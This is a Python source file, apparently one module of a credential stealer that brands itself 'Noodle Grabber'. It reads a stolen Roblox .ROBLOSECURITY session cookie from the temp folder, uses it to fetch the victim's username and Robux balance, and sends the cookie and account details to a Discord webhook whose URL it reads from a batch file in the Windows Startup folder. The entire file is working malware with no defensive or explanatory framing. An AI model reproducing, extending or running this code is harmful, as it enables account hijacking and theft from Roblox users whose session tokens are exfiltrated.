import requests
import os
import json

def robloxinfo(webhook):
    temp_path = os.environ["TEMP"]
    cookie_file_path = os.path.join(temp_path, "cookie.txt")
    
    if os.path.exists(cookie_file_path):
        with open(cookie_file_path, 'r', encoding="utf-8") as f:
            robo_cookie = f.read().strip()
            
            if robo_cookie == "No Roblox Cookies Found":
                return
            
            headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
            info = None
            
            try:
                response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
                response.raise_for_status()
                info = response.json()
            except requests.exceptions.RequestException:
                pass
            
            if info is not None:
                data = {
                    "embeds": [
                        {
                            "title": "Roblox Info",
                            "color": 16753920,
                            "fields": [
                                {
                                    "name": "<:roblox_icon:1041819334969937931> Name:",
                                    "value": f"`{info['UserName']}`",
                                    "inline": True
                                },
                                {
                                    "name": "<:robux_coin:1041813572407283842> Robux:",
                                    "value": f"`{info['RobuxBalance']}`",
                                    "inline": True
                                },
                                {
                                    "name": "🍪 Cookie:",
                                    "value": f"`{robo_cookie}`"
                                }
                            ],
                            "thumbnail": {
                                "url": info['ThumbnailUrl']
                            },
                            "footer": {
                                "text": "Noodle Grabber (https://github.com/UnrealNoodle)"
                            }
                        }
                    ],
                    "username": "Noodle Grabber",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1120798395389444169/1122895649201983519/image-250x250.jpg"
                }
                headers = {'Content-Type': 'application/json'}
                
                try:
                    response = requests.post(webhook, headers=headers, data=json.dumps(data))
                    response.raise_for_status()
                except requests.exceptions.RequestException:
                    pass

def get_webhook_from_file():
    startup_folder = os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    batch_file_path = os.path.join(startup_folder, "Noodle_Grabber_6.bat")

    if os.path.exists(batch_file_path):
        with open(batch_file_path, "r") as file:
            for line in file:
                if line.startswith('set "webhookUrl='):
                    webhook_url = line[len('set "webhookUrl='):].strip().strip('"')
                    return webhook_url

    return None


webhook_url = get_webhook_from_file()
if webhook_url:
    robloxinfo(webhook_url)
else:
    print("Webhook URL not found in the batch file.")
